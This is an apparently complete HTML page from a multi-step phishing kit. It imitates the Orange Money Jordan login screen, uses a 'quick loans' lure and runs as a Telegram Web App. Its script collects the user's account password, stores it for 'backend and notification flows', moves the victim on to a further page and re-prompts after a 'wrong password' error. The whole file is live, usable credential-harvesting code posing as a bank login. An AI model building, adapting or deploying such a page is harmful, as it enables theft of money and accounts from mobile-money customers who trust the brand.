<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>اورنج موني الأردن - تسجيل الدخول</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --orange-primary: #ff6600;
            --orange-gradient: linear-gradient(180deg, #ff7700 0%, #ff6600 100%);
            --bg-color: #ffffff;
            --text-dark: #333333;
            --text-muted: #777777;
            --border-orange: #ff6600;
            --btn-disabled-bg: #e2e2e2;
            --btn-disabled-text: #ffffff;
        }

        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif, -apple-system, BlinkMacSystemFont;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
            direction: rtl;
        }

        /* Top Header Area */
        .header-box { 
            width: 100%; 
            background: var(--orange-gradient); 
            padding: 30px 20px 25px; 
            color: white; 
            text-align: center; 
        }

        .header-title {
            font-size: 32px;
            font-weight: 800;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .header-title .orange-part { color: #ffffff; margin-left: 6px; }
        .header-title .money-part { color: #000000; }

        .sub-header-text { 
            font-size: 14px; 
            margin-top: 6px; 
            font-weight: 500;
            color: #ffffff;
        }

        /* Content Area */
        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: center; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 { 
            color: #555555; 
            font-size: 22px; 
            margin: 10px 0 25px; 
            font-weight: 600; 
        }

        /* Phone Display Field */
        .phone-display {
            width: 100%;
            border: 1.5px solid var(--border-orange);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 700;
            color: #222222;
            background-color: #ffffff;
            direction: ltr;
        }

        .flag-icon {
            font-size: 20px;
            line-height: 1;
        }

        /* Password Input Line Styling (Matching Photo Reference) */
        .password-section {
            width: 100%;
            text-align: right;
            margin-bottom: 10px;
        }

        .password-label { 
            color: var(--text-muted); 
            margin-bottom: 8px; 
            font-size: 14px; 
            font-weight: 500; 
            display: block;
        }

        .password-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
        }

        .password-input {
            width: 100%;
            height: 52px;
            border: 1.5px solid #dcdcdc;
            border-bottom: 2.5px solid var(--border-orange);
            border-radius: 8px;
            padding: 0 45px 0 16px;
            font-size: 16px;
            font-weight: 600;
            outline: none;
            background-color: #fafafa;
            color: #333333;
            transition: all 0.2s;
            direction: ltr;
            text-align: left;
        }

        .password-input:focus {
            border-color: var(--orange-primary);
            background-color: #ffffff;
        }

        .toggle-eye { 
            position: absolute;
            left: 14px;
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            height: 100%;
        }

        .forgot-pin {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 30px;
            display: inline-block;
            align-self: flex-start;
        }

        /* Submit Button */
        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            transition: background-color 0.2s;
        }

        .btn-submit.active {
            background-color: var(--orange-primary);
            color: #ffffff;
            cursor: pointer;
        }

        .btn-submit.active:hover {
            background-color: #e05500;
        }

        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 15px;
            width: 100%;
            display: none;
        }

        /* Bottom Curved Footer */
        .footer-box { 
            width: 100%; 
            background: var(--orange-gradient); 
            padding: 35px 20px 20px; 
            color: white; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
        }

        .footer-title {
            font-size: 28px;
            font-weight: 800;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .footer-title .orange-part { color: #ffffff; margin-left: 6px; }
        .footer-title .money-part { color: #000000; }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
        }

        .terms-text u { 
            color: #ffffff; 
            cursor: pointer; 
        }
    </style>
</head>

<body>

<!-- Header Section -->
<div class="header-box">
    <div class="header-title">
        <span class="orange-part">Orange</span><span class="money-part">Money</span>
    </div>
    <div class="sub-header-text">قروض سريعة وبسيطة</div>
</div>

<!-- Main Login Form -->
<div class="main-content">
    <h2>تسجيل الدخول</h2>

    <div id="errorDisplay" class="error-banner"></div>

    <!-- Displays Phone Number Filled in Previous Steps -->
    <div class="phone-display">
        <span class="flag-icon">🇯🇴</span>
        <span>+962</span>
        <span id="displayPhone">--</span>
    </div>

    <!-- Password Line Section -->
    <div class="password-section">
        <label class="password-label" for="passwordInput">كلمة المرور (Password)</label>
        <div class="password-wrapper">
            <input type="password" id="passwordInput" class="password-input" placeholder="أدخل كلمة المرور" autocomplete="current-password">
            <span class="toggle-eye" id="eyeIcon">👁️</span>
        </div>
    </div>

    <a href="#" class="forgot-pin">نسيت كلمة المرور؟</a>

    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
</div>

<!-- Bottom Curved Footer -->
<div class="footer-box">
    <div class="footer-title">
        <span class="orange-part">Orange</span><span class="money-part">Money</span>
    </div>
    <div class="sub-header-text">قروض سريعة وبسيطة</div>
    <p class="terms-text">بتسجيل دخولك، فإنك توافق على <u>الشروط والأحكام</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const passwordInput = document.getElementById('passwordInput');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    // Retrieve saved phone from previous steps (localStorage)
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "0771234567";
    displayPhone.textContent = savedPhone;

    // Detect wrong password redirected error
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin' || urlParams.get('error') === 'wrong_password') {
        errorDisplay.innerText = "❌ كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.";
        errorDisplay.style.display = "block";
    }

    // Enable button when password is typed
    passwordInput.addEventListener('input', () => {
        const hasText = passwordInput.value.trim().length > 0;
        loginBtn.disabled = !hasText;
        loginBtn.classList.toggle('active', hasText);
        errorDisplay.style.display = "none";
    });

    // Toggle password visibility with eye icon
    eye.addEventListener('click', () => {
        const isPassword = passwordInput.type === "password";
        passwordInput.type = isPassword ? "text" : "password";
        eye.textContent = isPassword ? "🙈" : "👁️";
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        const passwordValue = passwordInput.value.trim();
        
        // Preserve compatibility for backend and notification flows
        localStorage.setItem('lastPin', passwordValue);
        localStorage.setItem('lastPassword', passwordValue);

        errorDisplay.style.display = "none";

        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
